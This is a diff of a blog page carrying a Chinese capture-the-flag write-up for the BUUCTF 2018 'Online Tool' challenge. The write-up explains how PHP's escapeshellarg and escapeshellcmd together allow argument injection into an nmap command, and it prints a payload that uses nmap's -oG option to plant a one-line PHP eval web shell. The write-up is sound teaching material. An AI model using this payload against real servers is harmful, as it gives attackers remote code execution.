@@ -262,18 +262,18 @@
           <p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p>
 <a id="more"></a>
 
-<p><img src="/2020/07/15/BUUCTF2018-OnlineTool/1.png" alt="1"></p>
+<p><img data-action="zoom" src="/2020/07/15/BUUCTF2018-OnlineTool/1.png" alt="1"></p>
 <p>总体意思就是GET方式传递参数给host然后经过两个函数<code>escapeshellarg</code>和<code>escapeshellcmd</code>，最后执行<code>system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host)</code></p>
-<p><img src="/2020/07/15/BUUCTF2018-OnlineTool/2.png" alt="2"></p>
+<p><img data-action="zoom" src="/2020/07/15/BUUCTF2018-OnlineTool/2.png" alt="2"></p>
 <p>函数作用</p>
 <pre><code>1,确保用户值传递一个参数给命令
 2,用户不能指定更多的参数
-3,用户不能执行不同的命令</code></pre><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/3.png" alt="3"></p>
+3,用户不能执行不同的命令</code></pre><p><img data-action="zoom" src="/2020/07/15/BUUCTF2018-OnlineTool/3.png" alt="3"></p>
 <p>函数作用</p>
 <pre><code>1,确保用户只执行一个命令
 2,用户可以指定不限数量的参数
 3,用户不能执行不同的命令</code></pre><p>题目提示给了PHP和RCE</p>
-<p><img src="/2020/07/15/BUUCTF2018-OnlineTool/4.png" alt="4"></p>
+<p><img data-action="zoom" src="/2020/07/15/BUUCTF2018-OnlineTool/4.png" alt="4"></p>
 <p>这里关于PHP escapeshellarg()+escapeshellcmd()的RCE漏洞https:/<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener"></a>/paper.seebug.org/164/</p>
 <ol>
 <li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
@@ -282,7 +282,7 @@
 <li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</li>
 </ol>
 <p>接下来就是构造命令</p>
-<pre><code>?host=&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG shell.php &#39;</code></pre><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/5.png" alt="5"></p>
+<pre><code>?host=&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG shell.php &#39;</code></pre><p><img data-action="zoom" src="/2020/07/15/BUUCTF2018-OnlineTool/5.png" alt="5"></p>
 <p>文件路径/c42a72d0bb829f75f501621acb75dc05/shell.php</p>
 <p>蚁剑连接后在根目录找到flag</p>
 <p>nmap中文手册：<a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="noopener">http://www.nmap.com.cn/doc/manual.shtm</a></p>
@@ -314,7 +314,7 @@
             <a href="/2020/07/14/RoarCTF2019-EasyJava/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/a5fa4f9db760f58fc48f03d66b4967f7.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/1ac3fa3ef82c93a8d46384e256342711.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
